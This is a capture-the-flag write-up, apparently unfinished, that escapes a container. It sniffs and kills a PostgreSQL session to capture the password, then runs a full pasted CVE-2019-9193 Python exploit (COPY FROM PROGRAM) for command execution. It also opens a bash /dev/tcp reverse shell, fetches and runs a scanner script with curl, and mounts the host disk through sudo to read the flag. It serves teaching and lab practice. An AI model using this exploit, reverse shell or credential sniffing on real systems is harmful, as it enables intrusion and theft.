NOT ready yet

# Contain Me If You Can

<img width="622" height="388" alt="image" src="https://github.com/user-attachments/assets/13214e5e-c00e-40fd-bc96-85b81b139953" />



# Where we are ?

We starst inside a container, and we want to understand if this is a privilged container or we have other interesting things.  

From a first look it looks like a standrd docker container based on mount information:  
```
root@d86cf75f85ce:/# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/F2VC5GNNBDM5M6BVQHJ7J2V7DI:/var/lib/docker/overlay2/l/PUDUWBLOUV4KDA226EAPOCLY7U:/var/lib/docker/overlay2/l/DADW4QRM2QMV7JYQKZLCFHSXW3:/var/lib/docker/overlay2/l/FJGPNHG4APZTCSAAQUZTLVUW2O,upperdir=/var/lib/docker/overlay2/70c45a6fd7b5dbce380a090eeda2df54e00ed7ea0b094287da4d6229dd7de549/diff,workdir=/var/lib/docker/overlay2/70c45a6fd7b5dbce380a090eeda2df54e00ed7ea0b094287da4d6229dd7de549/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
/dev/vdb on /etc/resolv.conf type ext4 (rw,relatime)
/dev/vdb on /etc/hostname type ext4 (rw,relatime)
/dev/vdb on /etc/hosts type ext4 (rw,relatime)
proc on /proc/bus type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/fs type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/irq type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sys type proc (ro,nosuid,nodev,noexec,relatime)
proc on /proc/sysrq-trigger type proc (ro,nosuid,nodev,noexec,relatime)
tmpfs on /proc/acpi type tmpfs (ro,relatime)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/scsi type tmpfs (ro,relatime)
tmpfs on /sys/firmware type tmpfs (ro,relatime)
```

It's not a privileged a container based on the devices limitation:  
```
root@d86cf75f85ce:/# ls /dev
core  full    null  pts     shm     stdin   tty      zero
fd    mqueue  ptmx  random  stderr  stdout  urandom
```

I decided to use [deepce](https://github.com/stealthcopter/deepce) to scan and see if we have interesting things.  
But before that we need to install some libraries for the tool and also for us:  
```
apt update -y && apt install -y nmap iproute2 lsof net-tools  
```

Then install deepce:  
```
curl -o deepce.sh https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh && chmod +x deepce.sh && ./deepce.sh
```

Results:  
<img width="950" height="694" alt="image" src="https://github.com/user-attachments/assets/2f5d75e6-c290-4d94-be0e-2328c32865db" />  
<img width="1120" height="711" alt="image" src="https://github.com/user-attachments/assets/8b73a14f-2897-49a9-bc83-0864aed6b414" />  
<img width="1825" height="709" alt="image" src="https://github.com/user-attachments/assets/89f16854-8073-4ea3-8634-32f0fc9f1dbb" />  
<img width="1113" height="305" alt="image" src="https://github.com/user-attachments/assets/8b437658-0d46-4466-ba63-36fc881e70e6" />  


# Postgres service  
We see that there is open port 5432 on 172.19.0.2 which is another machine on the network with the name `postgres_db.user_db_network`.  
We can also see the Postgres's version (9.6.0) from running `nmap`:  
```
root@d86cf75f85ce:/# nmap -sV -p 5432 172.19.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-19 12:17 UTC
Nmap scan report for postgres_db.user_db_network (172.19.0.2)
Host is up (0.000056s latency).

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.94SVN%I=7%D=11/19%Time=691DB547%P=x86_64-pc-linux-gnu%
SF:r(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fro
SF:ntend\x20protocol\x2065363\.19778:\x20server\x20supports\x203\.0\x20to\
SF:x203\.0\0Fpostmaster\.c\0L2147\0RProcessStartupPacket\0\0");
MAC Address: 02:42:AC:13:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.33 seconds
```

We see that there is open connection from our container to the postgres service but there is no process attached to this connection:  
```
root@d86cf75f85ce:/# netstat -ntap
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:45601        0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.19.0.3:43558        172.19.0.2:5432         ESTABLISHED -
```

# Sniffing the network  
We opened a listener to see what is going on with `tcpdump`:  
```
root@d86cf75f85ce:/# tcpdump -i eth0 -AX host 172.19.0.2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
12:21:24.224772 IP d86cf75f85ce.43558 > postgres_db.user_db_network.postgresql: Flags [.], ack 105602432, win 501, options [nop,nop,TS val 1877805869 ecr 3050507752], length 0
        0x0000:  4500 0034 3cb8 4000 7f06 66e0 ac13 0003  E..4<.@...f.....
        0x0010:  ac13 0002 aa26 1538 7ee6 762c 064b 5d80  .....&.8~.v,.K].
        0x0020:  8010 01f5 5852 0000 0101 080a 6fed 0b2d  ....XR......o..-
        0x0030:  b5d3 0de8                                ....
12:21:24.224812 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.43558: Flags [.], ack 1, win 509, options [nop,nop,TS val 3050512978 ecr 1877800643], length 0
        0x0000:  4500 0034 f867 4000 7f06 ab30 ac13 0002  E..4.g@....0....
        0x0010:  ac13 0003 1538 aa26 064b 5d80 7ee6 762d  .....8.&.K].~.v-
        0x0020:  8010 01fd 5852 0000 0101 080a b5d3 2252  ....XR........"R
        0x0030:  6fec f6c3                                o...
12:21:29.344754 IP d86cf75f85ce.43558 > postgres_db.user_db_network.postgresql: Flags [.], ack 1, win 501, options [nop,nop,TS val 1877810989 ecr 3050512978], length 0
        0x0000:  4500 0034 3cb9 4000 7f06 66df ac13 0003  E..4<.@...f.....
        0x0010:  ac13 0002 aa26 1538 7ee6 762c 064b 5d80  .....&.8~.v,.K].
        0x0020:  8010 01f5 5852 0000 0101 080a 6fed 1f2d  ....XR......o..-
        0x0030:  b5d3 2252                                .."R
12:21:29.344784 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.43558: Flags [.], ack 1, win 509, options [nop,nop,TS val 3050518098 ecr 1877800643], length 0
        0x0000:  4500 0034 f868 4000 7f06 ab2f ac13 0002  E..4.h@..../....
        0x0010:  ac13 0003 1538 aa26 064b 5d80 7ee6 762d  .....8.&.K].~.v-
        0x0020:  8010 01fd 5852 0000 0101 080a b5d3 3652  ....XR........6R
        0x0030:  6fec f6c3                                o...
12:21:33.999691 IP d86cf75f85ce.43558 > postgres_db.user_db_network.postgresql: Flags [P.], seq 1:20, ack 1, win 501, options [nop,nop,TS val 1877815643 ecr 3050518098], length 19
        0x0000:  4500 0047 3cba 4000 7f06 66cb ac13 0003  E..G<.@...f.....
        0x0010:  ac13 0002 aa26 1538 7ee6 762d 064b 5d80  .....&.8~.v-.K].
        0x0020:  8018 01f5 5865 0000 0101 080a 6fed 315b  ....Xe......o.1[
        0x0030:  b5d3 3652 5100 0000 1253 454c 4543 5420  ..6RQ....SELECT.
        0x0040:  6e6f 7728 293b 00                        now();.
12:21:34.000191 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.43558: Flags [P.], seq 1:90, ack 20, win 509, options [nop,nop,TS val 3050522753 ecr 1877815643], length 89
        0x0000:  4500 008d f869 4000 7f06 aad5 ac13 0002  E....i@.........
        0x0010:  ac13 0003 1538 aa26 064b 5d80 7ee6 7640  .....8.&.K].~.v@
        0x0020:  8018 01fd 58ab 0000 0101 080a b5d3 4881  ....X.........H.
        0x0030:  6fed 315b 5400 0000 1c00 016e 6f77 0000  o.1[T......now..
        0x0040:  0000 0000 0000 0004 a000 08ff ffff ff00  ................
        0x0050:  0044 0000 0027 0001 0000 001d 3230 3235  .D...'......2025
        0x0060:  2d31 312d 3139 2031 323a 3231 3a33 342e  -11-19.12:21:34.
        0x0070:  3030 3030 3732 2b30 3043 0000 000d 5345  000072+00C....SE
        0x0080:  4c45 4354 2031 005a 0000 0005 49         LECT.1.Z....I
12:21:34.000202 IP d86cf75f85ce.43558 > postgres_db.user_db_network.postgresql: Flags [.], ack 90, win 501, options [nop,nop,TS val 1877815644 ecr 3050522753], length 0
        0x0000:  4500 0034 3cbb 4000 7f06 66dd ac13 0003  E..4<.@...f.....
        0x0010:  ac13 0002 aa26 1538 7ee6 7640 064b 5dd9  .....&.8~.v@.K].
        0x0020:  8010 01f5 5852 0000 0101 080a 6fed 315c  ....XR......o.1\
        0x0030:  b5d3 4881                                ..H.
^C
7 packets captured
7 packets received by filter
0 packets dropped by kernel
```

We notice that this communication repeat on itself where our container send "SELECT.now();" and the server returns with the time and "SELECT 1".  
Our container has some automation that is logged in to the postgres service.  
We didn't find credentials on the machine through files and environment variables.  
Our idea was to terminate the session and sniff it and see if it will send the credentials:  
```
tcpkill -i eth0 host 172.19.0.2 and port 5432 & tcpdump -i eth0 -AX host 172.19.0.2 and port 5432
```



Output: 

```
12:26:49.033799 IP d86cf75f85ce.56690 > postgres_db.user_db_network.postgresql: Flags [P.], seq 9:70, ack 2, win 502, options [nop,nop,TS val 1878130678 ecr 3050837787], length 61
        0x0000:  4500 0071 532b 4000 7f06 5030 ac13 0003  E..qS+@...P0....
        0x0010:  ac13 0002 dd72 1538 a784 8552 5c80 60a0  .....r.8...R\.`.
        0x0020:  8018 01f6 588f 0000 0101 080a 6ff1 fff6  ....X.......o...
        0x0030:  b5d8 171b 0000 003d 0003 0000 7573 6572  .......=....user
        0x0040:  0075 7365 7200 6461 7461 6261 7365 006d  .user.database.m
        0x0050:  7964 6174 6162 6173 6500 6170 706c 6963  ydatabase.applic
        0x0060:  6174 696f 6e5f 6e61 6d65 0070 7371 6c00  ation_name.psql.
        0x0070:  00                                       .
12:26:49.034517 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.56690: Flags [P.], seq 2:11, ack 70, win 509, options [nop,nop,TS val 3050837787 ecr 1878130678], length 9
        0x0000:  4500 003d cea3 4000 7f06 d4eb ac13 0002  E..=..@.........
        0x0010:  ac13 0003 1538 dd72 5c80 60a0 a784 858f  .....8.r\.`.....
        0x0020:  8018 01fd 585b 0000 0101 080a b5d8 171b  ....X[..........
        0x0030:  6ff1 fff6 5200 0000 0800 0000 03         o...R........
12:26:49.034540 IP d86cf75f85ce.56690 > postgres_db.user_db_network.postgresql: Flags [P.], seq 70:100, ack 11, win 502, options [nop,nop,TS val 1878130678 ecr 3050837787], length 30
        0x0000:  4500 0052 532c 4000 7f06 504e ac13 0003  E..RS,@...PN....
        0x0010:  ac13 0002 dd72 1538 a784 858f 5c80 60a9  .....r.8....\.`.
        0x0020:  8018 01f6 5870 0000 0101 080a 6ff1 fff6  ....Xp......o...
        0x0030:  b5d8 171b 7000 0000 1d53 6563 7265 7450  ....p....SecretP
        0x0040:  6f73 7467 7265 5351 4c50 6173 7377 6f72  ostgreSQLPasswor
        0x0050:  6400                                     d.
12:26:49.044647 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.56690: Flags [P.], seq 11:418, ack 100, win 509, options [nop,nop,TS val 3050837797 ecr 1878130678], length 407
        0x0000:  4500 01cb cea4 4000 7f06 d35c ac13 0002  E.....@....\....
        0x0010:  ac13 0003 1538 dd72 5c80 60a9 a784 85ad  .....8.r\.`.....
        0x0020:  8018 01fd 59e9 0000 0101 080a b5d8 1725  ....Y..........%
        0x0030:  6ff1 fff6 5200 0000 0800 0000 0053 0000  o...R........S..
        0x0040:  0017 696e 5f68 6f74 5f73 7461 6e64 6279  ..in_hot_standby
        0x0050:  006f 6666 0053 0000 0019 696e 7465 6765  .off.S....intege
        0x0060:  725f 6461 7465 7469 6d65 7300 6f6e 0053  r_datetimes.on.S
        0x0070:  0000 0011 5469 6d65 5a6f 6e65 0055 5443  ....TimeZone.UTC
        0x0080:  0053 0000 001b 496e 7465 7276 616c 5374  .S....IntervalSt
        0x0090:  796c 6500 706f 7374 6772 6573 0053 0000  yle.postgres.S..
        0x00a0:  0014 6973 5f73 7570 6572 7573 6572 006f  ..is_superuser.o
        0x00b0:  6e00 5300 0000 1a61 7070 6c69 6361 7469  n.S....applicati
        0x00c0:  6f6e 5f6e 616d 6500 7073 716c 0053 0000  on_name.psql.S..
        0x00d0:  0026 6465 6661 756c 745f 7472 616e 7361  .&default_transa
        0x00e0:  6374 696f 6e5f 7265 6164 5f6f 6e6c 7900  ction_read_only.
        0x00f0:  6f66 6600 5300 0000 1a73 6372 616d 5f69  off.S....scram_i
        0x0100:  7465 7261 7469 6f6e 7300 3430 3936 0053  terations.4096.S
        0x0110:  0000 0017 4461 7465 5374 796c 6500 4953  ....DateStyle.IS
        0x0120:  4f2c 204d 4459 0053 0000 0023 7374 616e  O,.MDY.S...#stan
        0x0130:  6461 7264 5f63 6f6e 666f 726d 696e 675f  dard_conforming_
        0x0140:  7374 7269 6e67 7300 6f6e 0053 0000 001f  strings.on.S....
        0x0150:  7365 7373 696f 6e5f 6175 7468 6f72 697a  session_authoriz
        0x0160:  6174 696f 6e00 7573 6572 0053 0000 0019  ation.user.S....
        0x0170:  636c 6965 6e74 5f65 6e63 6f64 696e 6700  client_encoding.
        0x0180:  5554 4638 0053 0000 0018 7365 7276 6572  UTF8.S....server
        0x0190:  5f76 6572 7369 6f6e 0031 362e 3800 5300  _version.16.8.S.
        0x01a0:  0000 1973 6572 7665 725f 656e 636f 6469  ...server_encodi
        0x01b0:  6e67 0055 5446 3800 4b00 0000 0c00 0004  ng.UTF8.K.......
        0x01c0:  ae76 b9e8 235a 0000 0005 49              .v..#Z....I
12:26:49.044797 IP d86cf75f85ce.56690 > postgres_db.user_db_network.postgresql: Flags [P.], seq 100:119, ack 418, win 501, options [nop,nop,TS val 1878130689 ecr 3050837797], length 19
        0x0000:  4500 0047 532d 4000 7f06 5058 ac13 0003  E..GS-@...PX....
        0x0010:  ac13 0002 dd72 1538 a784 85ad 5c80 6240  .....r.8....\.b@
        0x0020:  8018 01f5 5865 0000 0101 080a 6ff2 0001  ....Xe......o...
        0x0030:  b5d8 1725 5100 0000 1253 454c 4543 5420  ...%Q....SELECT.
        0x0040:  6e6f 7728 293b 00                        now();.
12:26:49.045144 IP postgres_db.user_db_network.postgresql > d86cf75f85ce.56690: Flags [P.], seq 418:506, ack 119, win 509, options [nop,nop,TS val 3050837798 ecr 1878130689], length 88
        0x0000:  4500 008c cea5 4000 7f06 d49a ac13 0002  E.....@.........
        0x0010:  ac13 0003 1538 dd72 5c80 6240 a784 85c0  .....8.r\.b@....
        0x0020:  8018 01fd 58aa 0000 0101 080a b5d8 1726  ....X..........&
        0x0030:  6ff2 0001 5400 0000 1c00 016e 6f77 0000  o...T......now..
        0x0040:  0000 0000 0000 0004 a000 08ff ffff ff00  ................
        0x0050:  0044 0000 0026 0001 0000 001c 3230 3235  .D...&......2025
        0x0060:  2d31 312d 3139 2031 323a 3236 3a34 392e  -11-19.12:26:49.
        0x0070:  3034 3438 322b 3030 4300 0000 0d53 454c  04482+00C....SEL
        0x0080:  4543 5420 3100 5a00 0000 0549            ECT.1.Z....I

```


The credentials are:  
```
User: user
Password: SecretPostgreSQLPassword
Database: mydatabase
```

We can now login to the postgres by running:  
```
psql -h 172.19.0.2 -p 5432 -U user mydatabase 
```

# RCE through postgres  

In this part there are two options:  
1. We checked and found that the postgres version is vulnerable to RCE (CVE-2019-9193) and we can use [this](https://github.com/b4keSn4ke/CVE-2019-9193/blob/main/cve-2019-9193.py) exploit:

```
# Date: 2022-03-29
# Exploit Title: PostgreSQL 9.3-11.7 Authenticated Remote Code Execution 
# Exploit Author: b4keSn4ke
# Github: https://github.com/b4keSn4ke
# Vendor Homepage: https://www.postgresql.org/
# Software Link: https://www.postgresql.org/download/linux/debian/
# Version: 9.3 - 12.3
# Tested on: Linux x86-64 - Debian 4.19, 8.3.0
# CVE: CVE-2019–9193
# 
#!/usr/bin/python3 

import psycopg2
import argparse
import hashlib
import time

def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-12.3 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
    args = parser.parse_args()
    return args

def main():
    try:
        print ("\r\n[+] Connecting to PostgreSQL Database on {0}:{1}".format(args.ip, args.port))
        connection = psycopg2.connect (
            database=args.database, 
            user=args.user, 
            password=args.password, 
            host=args.ip, 
            port=args.port, 
            connect_timeout=args.timeout
        )
        print ("[+] Connection to Database established")
        
        print ("[+] Checking PostgreSQL version")
        checkVersion(connection)

        if(args.command):
            exploit(connection)
        else:
            print ("[+] Add the argument -c [COMMAND] to execute a system command")

    except psycopg2.OperationalError as e:
        print ("\r\n[-] Connection to Database failed: \r\n{0}".format(e))
        exit()

def checkVersion(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()

    result = deserialize(record)
    version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])

    if (version >= 9.3):
        print("[+] PostgreSQL {0} is likely vulnerable".format(version))

    else:
        print("[-] PostgreSQL {0} may not vulnerable".format(version))

def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0]+"\r\n"
    return result

def randomizeTableName():
    return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())

def exploit(connection):
    cursor = connection.cursor()
    tableName = randomizeTableName()
    try:
        print ("[+] Creating table {0}".format(tableName))
        cursor.execute("DROP TABLE IF EXISTS {1};\
                        CREATE TABLE {1}(cmd_output text);\
                        COPY {1} FROM PROGRAM '{0}';\
                        SELECT * FROM {1};".format(args.command,tableName))

        print ("[+] Command executed\r\n")
        
        record = cursor.fetchall()
        result = deserialize(record)

        print(result)
        print ("[+] Deleting table {0}\r\n".format(tableName))

        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    except psycopg2.errors.ExternalRoutineException as e:
        print ("[-] Command failed : {0}".format(e.pgerror))
        print ("[+] Deleting table {0}\r\n".format(tableName))
        cursor = connection.cursor()
        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    finally:
        exit()

if __name__ == "__main__":
    args = parseArgs()
    main()
```

We can save it and run it like:  
```
chmod +x exploit.py
python3 exploit.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "whoami"
```


But it failed:  
```
ModuleNotFoundError: No module named 'psycopg2'
```

When trying to install with `pip3` and `pip` it failed:  
```
root@0702d2dcd3d6:/# pip3 install psycopg2
error: externally-managed-environment

× This environment is externally managed
������> To install Python packages system-wide, try apt install
    python3-xyz, where xyz is the package you are trying to
    install.
    
    If you wish to install a non-Debian-packaged Python package,
    create a virtual environment using python3 -m venv path/to/venv.
    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make
    sure you have python3-full installed.
    
    If you wish to install a non-Debian packaged Python application,
    it may be easiest to use pipx install xyz, which will manage a
    virtual environment for you. Make sure you have pipx installed.
    
    See /usr/share/doc/python3.12/README.venv for more information.

note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.
hint: See PEP 668 for the detailed specification.

```

Same thing with `apt`:
```
root@0702d2dcd3d6:/# apt install -y python3-psycopg2
E: dpkg was interrupted, you must manually run 'dpkg --configure -a' to correct the problem.
```


Eventually we were able to install it like that:  
```
root@0702d2dcd3d6:/# pip3 install psycopg2-binary --break-system-packages
Collecting psycopg2-binary
  Downloading psycopg2_binary-2.9.11-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (4.9 kB)
Downloading psycopg2_binary-2.9.11-cp312-cp312-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (4.2 MB)
   ����������������������������������������������������������������������������������������������������
   �����������������������������������������������������������������━━���������������������������������
   ����������������������������������������������������������������������������������������������������
   ������������������������������������������������������������������������������������������������������������������������ 4.2/4.2 MB 41.1 MB/s eta 0:00:00
Installing collected packages: psycopg2-binary
Successfully installed psycopg2-binary-2.9.11
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
```

Now the exploit works:  
```
root@d86cf75f85ce:/# python3 exploit.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "ls /dev" -d mydatabase

[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 16.8 is likely vulnerable
[+] Creating table _f42b1f5ff8aa24f166473377ee9f9873
[+] Command executed

postgres

[+] Deleting table _f42b1f5ff8aa24f166473377ee9f9873
```


2. We can use the `COPY` command to run commands through postgres.

We first login to the database:  
```
psql -h 172.19.0.2 -p 5432 -U user mydatabase
# Enter the SecretPostgreSQLPassword password
```

We get the postgres shell:  
```
root@d86cf75f85ce:/# psql -h 172.19.0.2 -p 5432 -U user mydatabase 
Password for user user: 
psql (16.9 (Ubuntu 16.9-0ubuntu0.24.04.1), server 16.8)
Type "help" for help.

mydatabase=#
```

We will use the `COPY` command like that:  
```
mydatabase=# CREATE TEMPORARY TABLE temp_output (output_text text);COPY temp_output FROM PROGRAM 'whoami';SELECT * FROM temp_output;
CREATE TABLE
COPY 1
 output_text 
-------------
 postgres
(1 row)

```


# Reverse Shell
To make things easier, we can generate reverse shell with `tmux`:
```
apt install -y tmux
```


Once inside tmux:

Horizontal split (top/bottom):
Press: `Ctrl + b` then press `"` (double quote)

Vertical split (left/right):
Press: `Ctrl + b` then press `%`

To move between the windows press `Ctrl+b` + Arrow up/down.  

In one window we listen:  
```
nc -nvlp 1338
```

In the second one we can use this command after we logged in to the postgres:  
```
CREATE TEMPORARY TABLE temp_output (output_text text);COPY temp_output FROM PROGRAM '/bin/bash -c "bash -i >& /dev/tcp/172.19.0.3/1338 0>&1"';SELECT * FROM temp_output;
```

We will get this window:  
<img width="1161" height="549" alt="image" src="https://github.com/user-attachments/assets/8d259980-5d49-4927-9dc9-012a4051d29a" />


# Reconassis Container 2  

We are running with a `postgres` user which is not root.  
Checking the `/dev` folder shows that we are in a privileged container, we can see all the devices:  
```
[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 16.8 is likely vulnerable
[+] Creating table _9edefcac05c8b7be40455bce49929b76
[+] Command executed

autofs
core
cpu
cpu_dma_latency
fd
...
vcs
vcs1
vcsa
vcsa1
vcsu
vcsu1
vda
vdb
vsock
zero

[+] Deleting table _9edefcac05c8b7be40455bce49929b76
```

But we first need to get root.  




# Getting root

The most trivial way is to search for SUID bit files:  
```
find /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f
```


Running it showed the `/usr/bin/sudo`:   
```
root@d86cf75f85ce:/# python3 exploit.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "find /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f" -d mydatabase
 mydatabasessword -c "find /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f" -d 
[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 16.8 is likely vulnerable
[+] Creating table _5e0871324179a9e72ef76fb78c1b72d2
[+] Command executed

/usr/bin/sudo

[+] Deleting table _5e0871324179a9e72ef76fb78c1b72d2
```


# Breaking to the host  

From this point it is straightforward, we will create a mount to the host device and open the file.  

But we first need to check what is the host device.  

We check the `/proc/cmdline` content:  
```
root@d86cf75f85ce:/# python3 exploit.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "cat /proc/cmdline" -d mydatabaseroc/cmdline" -d mydatabase

[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 16.8 is likely vulnerable
[+] Creating table _9bfa4f4a3c4d809ea80c6a6a69175e0c
[+] Command executed

console=ttyS0 quiet loglevel=0 reboot=k panic=1 pci=off init=/sbin/overlay-init root=/dev/vda ro virtio_mmio.device=4K@0xd0000000:5 virtio_mmio.device=4K@0xd0001000:6 virtio_mmio.device=4K@0xd0002000:7

[+] Deleting table _9bfa4f4a3c4d809ea80c6a6a69175e0c
```

The host device is `/dev/vda`.  
We will create a mount to the host using the `sudo` file:   
```
root@d86cf75f85ce:/# python3 exploit.py -i 172.19.0.2 -p 5432 -U user -P SecretPostgreSQLPassword -c "mkdir /tmp/host && /usr/bin/sudo mount /dev/vda /tmp/host && cat /tmp/host/flag" -d mydatabase

[+] Connecting to PostgreSQL Database on 172.19.0.2:5432
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 16.8 is likely vulnerable
[+] Creating table _d41cd02c7242ffa90622160237309983
[+] Command executed

WIZ_CTF{how_the_tables_have_turned_guests_to_hosts}

[+] Deleting table _d41cd02c7242ffa90622160237309983
```

The flag:  
```
WIZ_CTF{how_the_tables_have_turned_guests_to_hosts}
```
